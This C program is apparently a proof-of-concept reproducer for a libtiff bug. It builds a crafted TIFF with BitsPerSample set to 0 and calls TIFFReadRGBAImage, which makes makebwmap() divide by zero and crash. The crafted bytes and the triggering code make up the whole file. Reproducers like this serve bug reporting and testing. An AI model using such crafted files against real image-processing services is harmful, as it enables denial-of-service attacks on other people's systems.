#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <tiffio.h>

/*
 * Craft a minimal TIFF (little-endian classic TIFF) with:
 *  - PhotometricInterpretation = MINISBLACK (1)
 *  - SamplesPerPixel = 1
 *  - BitsPerSample = 0  (invalid on purpose)
 *  - Compression = None
 *  - PlanarConfiguration = Contig
 *  - 1x1 image with a single data byte
 *
 * This triggers makebwmap() via the TIFFReadRGBAImage() grayscale
 * setup path, which computes nsamples = 8 / bitspersample with
 * bitspersample = 0, causing a divide-by-zero.
 */
static const unsigned char tiff_data[] = {
    /* Header: II (little endian), magic 42, IFD offset = 8 */
    0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00,

    /* IFD with 10 entries */
    0x0A, 0x00,

    /* Tag 0x0100 ImageWidth: LONG, 1, value = 1 */
    0x00, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0101 ImageLength: LONG, 1, value = 1 */
    0x01, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0102 BitsPerSample: SHORT, 1, value = 0 (crafted) */
    0x02, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

    /* Tag 0x0103 Compression: SHORT, 1, value = 1 (none) */
    0x03, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0106 PhotometricInterpretation: SHORT, 1, value = 1 (MINISBLACK) */
    0x06, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0111 StripOffsets: LONG, 1, value = 134 (offset to data) */
    0x11, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x86, 0x00, 0x00, 0x00,

    /* Tag 0x0115 SamplesPerPixel: SHORT, 1, value = 1 */
    0x15, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0116 RowsPerStrip: LONG, 1, value = 1 */
    0x16, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x0117 StripByteCounts: LONG, 1, value = 1 */
    0x17, 0x01, 0x04, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* Tag 0x011C PlanarConfiguration: SHORT, 1, value = 1 (contig) */
    0x1C, 0x01, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,

    /* next IFD offset = 0 */
    0x00, 0x00, 0x00, 0x00,

    /* Image data at offset 134 (0x86): single byte */
    0x00
};

int main(void) {
    char tmpl[] = "/tmp/libtiff_div0_XXXXXX";
    int fd = mkstemp(tmpl);
    if (fd < 0) {
        perror("mkstemp");
        return 1;
    }

    FILE *f = fdopen(fd, "wb");
    if (!f) {
        perror("fdopen");
        close(fd);
        unlink(tmpl);
        return 1;
    }

    size_t nw = fwrite(tiff_data, 1, sizeof(tiff_data), f);
    if (nw != sizeof(tiff_data)) {
        fprintf(stderr, "short write: %zu/%zu\n", nw, sizeof(tiff_data));
        fclose(f);
        unlink(tmpl);
        return 1;
    }
    fclose(f);

    TIFF *tif = TIFFOpen(tmpl, "r");
    if (!tif) {
        fprintf(stderr, "TIFFOpen failed\n");
        unlink(tmpl);
        return 1;
    }

    uint32_t w = 1, h = 1;
    uint32_t raster[1];

    /* This call sets up the RGBA conversion, which will hit makebwmap() */
    int ok = TIFFReadRGBAImage(tif, w, h, raster, 0);
    /* We don't expect to reach here if the divide-by-zero occurs */
    fprintf(stderr, "TIFFReadRGBAImage returned: %d\n", ok);

    TIFFClose(tif);
    unlink(tmpl);
    return 0;
}
